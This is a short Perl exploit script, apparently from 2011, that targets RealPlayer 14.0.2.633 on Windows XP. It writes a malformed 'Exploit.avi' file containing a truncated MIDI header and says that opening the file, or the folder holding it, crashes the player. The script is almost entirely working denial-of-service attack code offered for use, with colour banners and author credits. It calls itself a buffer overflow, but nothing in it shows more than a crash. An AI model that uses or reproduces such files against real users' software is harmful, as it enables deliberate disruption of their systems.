#!/usr/bin/perl  

#(+)Exploit Title: Real player 14.0.2.633 Buffer overflow/DOS Exploit  

#(+)Software Link: www.soft32.com/download_122615.html  

#(+)Software:  Real player  

#(+)Version:   14.0.2.633  

#(+)Tested On: WIN-XP SP3  

#(+) Date    : 31.03.2011  

#(+) Hour    : 13:37 PM  

#Similar Bug was found by cr4wl3r in MediaPlayer Classic  

system("color 6");  

system("title Real player 14.0.2.633 Buffer overflow/DOS Exploit");  

print "  

_______________________________________________________________________  

                                                                       

(+)Exploit Title: Real player 14.0.2.633 Buffer overflow/DOS Exploit    

    

(+) Software Link: www.soft32.com/download_122615.html                    

(+) Software:  Real player                                                

(+) Version:   14.0.2.633                                                 

(+) Tested On: WIN-XP SP3                                                 

(+) Date    : 31.03.2011                                                  

(+) Hour    : 13:37 PM                                                    

____________________________________________________________________\n";  

sleep 2;  

system("cls");  

system("color 2");  

print "\nGenerating the exploit file !!!";  

sleep 2;  

print "\n\nExploit.avi file generated!!";  

sleep 2;  

$theoverflow = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";  

    

open(file, "> Exploit.avi");  

print (file $theoverflow);  

print "\n\n(+) Done!\n  

(+) Now Just open Explot.avi with Real Player and Kaboooommm !! ;) \n  

(+) Most of the times there is a crash\n whenever you open the folder where the Exploit.avi is stored :D \n";  

   

sleep 3;  

system("cls");  

sleep 1;  

system("color C");  

print "\n\n\n########################################################################\n  

(+)Exploit Coded by: ^Xecuti0N3r \n  

(+)^Xecuti0N3r: E-mail \n  

(+)d3M0l!tioN3r: E-mail \n  

(+)Special Thanks to: MaxCaps, aNnIh!LatioN3r & d3M0l!tioN3r \n  

########################################################################\n\n";  

system("pause"); 
